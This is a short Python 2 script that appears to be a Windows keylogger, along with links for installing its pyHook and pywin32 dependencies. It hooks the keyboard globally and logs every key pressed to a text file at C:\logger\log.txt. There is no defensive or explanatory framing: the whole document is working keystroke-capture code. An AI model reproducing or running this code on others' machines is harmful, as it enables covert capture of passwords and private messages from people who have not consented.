"""
Modules - 

Official pyHook Module = http://sourceforge.net/projects/pyhook/
pyrhoncom Module: http://sourceforge.net/projects/pywin32/

- Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/
"""


try:
    import pythoncom, pyHook
except:
    print "Please Install the pythoncom and pyHook modules"
    exit(0)

import sys
import logging

file_log = 'C:\\logger\\log.txt'

def OnKeyBoardEvent (event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyBoardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
